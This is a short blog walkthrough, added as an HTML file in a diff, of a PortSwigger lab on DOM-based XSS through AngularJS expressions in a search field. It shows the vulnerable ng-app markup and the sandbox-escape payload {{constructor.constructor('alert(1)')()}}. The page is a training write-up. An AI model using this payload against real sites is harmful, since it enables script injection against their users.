@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>WSA: DOM XSS in AngularJS expression</title>
+<meta name="author" content="Lamprinos Chatziioannou" />
+<meta name="description" content="Walkthrough to WSA lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded" />
+<meta name="generator" content="Org Mode" />
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script>
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="./index.html"> UP </a>
+ |
+ <a accesskey="H" href="/index.html"> HOME </a>
+</div><div id="content" class="content">
+<h1 class="title">WSA: DOM XSS in AngularJS expression</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgb655937">Challenge</a>
+<ul>
+<li><a href="#org6978123">Vulnerable part</a></li>
+<li><a href="#org35e8971">Solution</a></li>
+<li><a href="#orgdbc721d">Note on Angular</a></li>
+</ul>
+</li>
+<li><a href="#orgf95a5b4">Summary</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgb655937" class="outline-2">
+<h2 id="orgb655937"><a href="#orgb655937">Challenge</a></h2>
+<div class="outline-text-2" id="text-orgb655937">
+<p>
+You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression">here</a>
+</p>
+
+<p>
+Having to deal with AngularJS, we know that we should pay special
+attention to all elements with a <code>ng-sth</code> attribute, since that is
+linked to Angular.
+</p>
+
+<p>
+There is a search functionality, a good starting place, and the text
+which we supply gets shown in the source code:
+</p>
+
+
+<div id="org8bd96f7" class="figure">
+<p><img src="images/Challenge/20240227_112515_screenshot.png" alt="20240227_112515_screenshot.png">
+</p>
+<p><span class="figure-number">Figure 1: </span>Sample Input</p>
+</div>
+</div>
+
+
+<div id="outline-container-org6978123" class="outline-3">
+<h3 id="org6978123"><a href="#org6978123">Vulnerable part</a></h3>
+<div class="outline-text-3" id="text-org6978123">
+<p>
+We can <i>verify</i> that the website uses angular:
+</p>
+
+<p>
+NG-app
+</p>
+<div class="org-src-container">
+<pre class="src src-html">&lt;body ng-app="" class="ng-scope"&gt;
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-html" id="orgfafb078">&lt;section class="search"&gt;
+  &lt;form action="/" method="GET" class="ng-pristine ng-valid"&gt;
+    &lt;input type="text" placeholder="Search the blog..." name="search"&gt;
+    &lt;button type="submit" class="button"&gt;Search&lt;/button&gt;
+  &lt;/form&gt;
+&lt;/section&gt;
+</pre>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-org35e8971" class="outline-3">
+<h3 id="org35e8971"><a href="#org35e8971">Solution</a></h3>
+<div class="outline-text-3" id="text-org35e8971">
+<p>
+After playing around, testing <code>{{alert(1)}}</code> and similar naive payloads
+:P, then checking out the documentation for ways to effectively use
+<code>{{}}</code> to our advantage, the solution was given by <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md">PayloadsAllTheThings</a>.
+</p>
+
+<pre class="example" id="orgb2c4eee">
+{{constructor.constructor('alert(1)')()}}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgdbc721d" class="outline-3">
+<h3 id="orgdbc721d"><a href="#orgdbc721d">Note on Angular</a></h3>
+<div class="outline-text-3" id="text-orgdbc721d">
+<p>
+For more info check out:
+</p>
+<ol class="org-ol">
+<li><a href="https://docs.angularjs.org/tutorial/step_02">https://docs.angularjs.org/tutorial/step_02</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md">PayloadsAllTheThings: XSS In AngularJS</a></li>
+</ol>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgf95a5b4" class="outline-2">
+<h2 id="orgf95a5b4"><a href="#orgf95a5b4">Summary</a></h2>
+<div class="outline-text-2" id="text-orgf95a5b4">
+<div class="tenor-gif-embed" data-postid="18768386" data-share-method="host" data-aspect-ratio="1.34454" data-width="100%"><a href="https://tenor.com/view/annoyed-alive-annoying-anniversary-ahh-gif-18768386">Annoyed Alive GIF</a>from <a href="https://tenor.com/search/annoyed-gifs">Annoyed GIFs</a></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2024-02-27 Tue 11:21</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+</div>
+</body>
+</html>
